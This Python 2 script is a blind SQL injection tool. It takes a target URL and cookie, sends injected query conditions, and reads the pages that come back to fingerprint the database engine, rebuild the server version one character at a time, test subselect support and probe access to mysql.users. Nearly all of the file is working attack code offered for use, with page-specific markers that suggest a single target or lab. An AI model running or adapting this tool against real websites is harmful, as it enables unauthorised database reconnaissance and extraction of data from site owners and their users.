import sys
import urllib
import urllib2
import getopt
import os.path

_url = ''
_cookie = ''

CHAR = '.5078912346-abcdefghijklmnopqrstuvwxyz0123456789'
DETECTION = [["Microsoft MS-SQL Server","len(log10(10))"],
             ["MySQL Server","truncate(log10(10),0)"],
             ["PostgreSQL Server","char_length(trunc(1.1,0))"],
             ["Microsoft Access Database","choose(0,len(1),0)"],
             ["Oracle Database Server","bitand(trunc(1.1,0),1)"]]

def usage() :
    print "\nUsage : python "+os.path.basename(sys.argv[0])+" --url http://.../...?param=value [--cookie value]\n"
    sys.exit(1)
    
def toStr(b, t, f):
    if b:
        return t
    else:
        return f

def checkUrl():
    global _headers
    global _url
    req = urllib2.Request(_url, None, _headers)
    try:
        res = urllib2.urlopen(req)
        return True
    except urllib2.HTTPError, e :
        print e.code
        return False

def encode(text):
    text = text.replace(" ", "%20");
    text = text.replace("'", "%27");
    return text

def testUrl(injection, check, failed):
    global _headers
    global _url
    tmpUrl = encode(_url + injection)
    req = urllib2.Request(tmpUrl, None, _headers)
    try:
        res = urllib2.urlopen(req)
        content = res.read()
        if check in content:
            return not failed
        else:
            return failed
    except urllib2.HTTPError, e :
        print e.code
        return False

def checkSubselect():
    return testUrl('\' and (select 1)=\'1', '<div class="thumbBox">', False)

def checkUserAccess():
    return testUrl('\' and (SELECT 1 from mysql.users limit 0,1)=\'1', 'Error, query failed', True)
    
def getLengthOf(var):
    l = 0;
    for i in range(1, 10):
        if testUrl('\' and LENGTH('+var+')=\''+str(i), '<div class="thumbBox">', False):
            l = i;
            break
    return l

def getType():
    global DETECTION
    for detect in DETECTION:
        if testUrl('\' and ' + detect[1] + '=\'1', 'Error, query failed', True):
            return detect[0]
    return "Unknown"

def getVersion():
    versionLength = getLengthOf('version()')
    if versionLength==0:
        return "Version length appears to be 0, check your url or cookie !"
        
    v = ""
    for i in range(1, versionLength+1):
        for c in CHAR:
            if testUrl('\' and substring(version(),'+str(i)+',1)=\''+c, '<div class="thumbBox">', False):
                v = v + c
                break
    return v

###################################################################################################

try:
    opts, args = getopt.getopt(sys.argv[1:], "u:c:hvt", ["url=", "cookie=", "help", "version", "type"])
except getopt.GetoptError:
    usage()

for opt, arg in opts:
    if opt in ("-h", "--help"):
        usage()
        sys.exit()
    elif opt in ("-u", "--url"):
        _url = arg
    elif opt in ("-c", "--cookie"):
        _cookie = arg

if _url == "" :
    usage();
_headers = { 'Cookie' : _cookie }

print
print "---------------------------------------x------"
print "|              Blind Injection               |"
print "----------------------------------------------"
print
print "Options : "
print "    Url : " + _url
print "    Cookie : " + _cookie
print

###################################################################################################

print "[+] Testing server"

state = checkUrl()
print "        state : " + toStr(state, 'up', 'down')
if not state:
    sys.exit(2)

type = getType()
print "        type : " + type

version = getVersion()
print "        Version : " + version 

subselect = checkSubselect()    
print '        subselect : ' + toStr(subselect, 'yes', 'no')

useraccess = checkUserAccess()
print '        mysql.user access : ', toStr(useraccess, 'yes', 'no')

    
sys.exit(0)
